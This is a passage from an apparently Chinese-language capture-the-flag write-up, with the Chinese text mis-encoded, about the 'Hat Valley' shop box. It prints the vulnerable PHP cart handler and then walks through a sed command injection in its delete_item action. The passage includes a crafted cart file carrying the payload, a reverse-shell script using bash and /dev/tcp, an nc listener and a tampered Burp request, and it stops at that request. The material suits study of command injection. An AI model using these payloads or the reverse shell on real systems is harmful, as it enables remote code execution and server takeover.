# Hat Valley - Shop Online!                                                         
                                                                                     
### To Do                                                                             
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)                 
3. Implement shop filter                                                             
4. Get full catalogue of items                                                                           
### How to Add New Catalogue Item                                                     
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.  
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹<code>cart_actions.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$STORE_HOME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/store/"</span><span class="token punctuation">;</span>

<span class="token comment">//check for valid hat valley store item</span>
<span class="token keyword">function</span> <span class="token function-definition function">checkValidItem</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$first_line</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$first_line</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"***Hat Valley"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//add to cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'add_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo '***Hat Valley Cart***' &gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head -2 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt | tail -1 &gt;&gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item added successfully!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//delete from cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'delete_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sed -i '/item_id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>/d' <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item removed from cart"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//fetch from cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'fetch_items'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user_id</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$product_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$file</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$details</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$product_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"***Hat Valley Cart***"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//don't include first line</span>
                    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$details</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$details</span> <span class="token keyword">as</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$cart_items</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cart_items</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                      <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key and value as separate values in subarray</span>
                 <span class="token punctuation">}</span>
                 <span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;tr&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;&lt;button data-id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span> onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å…­ã€RCE"><a href="#å…­ã€RCE" class="headerlink" title="å…­ã€RCE"></a>å…­ã€RCE</h2><p>å®¡è®¡ï¼Œå…¶ä¸­åœ¨åˆ é™¤è´­ç‰©è½¦ä¿¡æ¯çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
æ³¨ï¼š
'/item_id={$item_id}/d'				#åˆ é™¤item_id={$item_id}çš„è¡Œ
-i {$STORE_HOME}cart/{$user_id}		#è¡¨ç¤ºè¦æ“ä½œçš„ç›®æ ‡æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªå•†å“åˆ°è´­ç‰©è½¦ï¼Œåˆ†æä¸€ä¸‹è¿‡ç¨‹ã€‚å¦‚ä¸‹å›¾ç‚¹å‡»<code>ADD TO CART</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304093729084.png"></p>
<p>ç„¶ååˆ°beanç”¨æˆ·çš„sshçª—å£æŸ¥çœ‹<code>/var/www/store/cart</code>ï¼ˆç”±ä¸Šé¢çš„<code>README.md</code>æ–‡ä»¶æˆ–è€…<code>cart_actions.php</code>å¯ä»¥åˆ†æå‡ºè¿™ä¸ªè·¯å¾„ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶åä¸º<code>959e-8a52-2e0-fc52</code>ï¼Œä¹Ÿå°±æ˜¯<code>$user_id</code>çš„å€¼ï¼Œæ–‡ä»¶å†…å®¹é‡Œ<code>item_id=1</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store/cart$ ls
959e-8a52-2e0-fc52
bean@awkward:/var/www/store/cart$ cat 959e-8a52-2e0-fc52 
***Hat Valley Cart***
item_id=1&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»£ç ä¸­<code>item_id=1</code>ä¼šè¢«ä»£å…¥sedå‘½ä»¤æ‰§è¡Œï¼Œè™½ç„¶æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é—­åˆç»•è¿‡ï¼Œè¿™é‡Œå°±æ˜¯å¯æ“ä½œçš„åœ°æ–¹ã€‚ç»è¿‡æµ‹è¯•ï¼Œå¯¹äºåŒä¸€ä¸ªç”¨æˆ·<code>$user_id</code>çš„å€¼ä¸ä¼šå˜ï¼Œè€Œä¸”beanæ²¡æœ‰ä¿®æ”¹è´­ç‰©è½¦æ–‡ä»¶çš„æƒé™ï¼Œä½†æ˜¯å¯ä»¥å…ˆåˆ é™¤ï¼Œç„¶åé‡æ–°å†™ä¸€ä¸ªç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œå¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ rm -rf cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ nano cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ cat cart/959e-8a52-2e0-fc52
***Hat Valley Cart***
item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ„é€ payloadå¯å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p>æˆ‘ä»¬æ„é€ çš„payloadåŠæœ€ç»ˆä»£å…¥sedå‘½ä»¤çš„æ•ˆæœå¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '
sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}
sed -i '1' -e "1e /tmp/shell.sh" /tmp/shell.sh '' /var/www/store/cart/959e-8a52-2e0-fc52
æ³¨ï¼š
-e&lt;script&gt;æˆ–--expression=&lt;script&gt;è¡¨ç¤ºä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ²¡æœ‰vimï¼Œé‚£å°±ç”¨nanoåœ¨<code>/tmp</code>ç›®å½•å†™å…¥åå¼¹shellæ–‡ä»¶<code>shell.sh</code>ï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/tmp$ nano shell.sh
bean@awkward:/tmp$ cat shell.sh 
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/[æœ¬åœ°IP]/[æƒ³è¦ç›‘å¬çš„PORT] 0&gt;&amp;1

bean@awkward:/tmp$ ls -l shell.sh 
-rw-rw-r-- 1 bean bean 55 Mar  4 12:29 shell.sh
bean@awkward:/tmp$ chmod +x shell.sh 
bean@awkward:/tmp$ ls -l shell.sh 
-rwxrwxr-x 1 bean bean 55 Mar  4 12:29 shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€å¯ncç›‘å¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 9001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰“å¼€Burpsuiteï¼Œç„¶åæ‰“å¼€å¦‚ä¸‹è´­ç‰©è½¦ç•Œé¢ï¼Œç‚¹å‡»<code>Remove</code>çš„åŒæ—¶æˆªè·è¯·æ±‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304094937675.png"></p>
<p>ä¿®æ”¹è¯·æ±‚æ•°æ®å¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&amp;user=959e-8a52-2e0-fc52&amp;action=delete_item<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

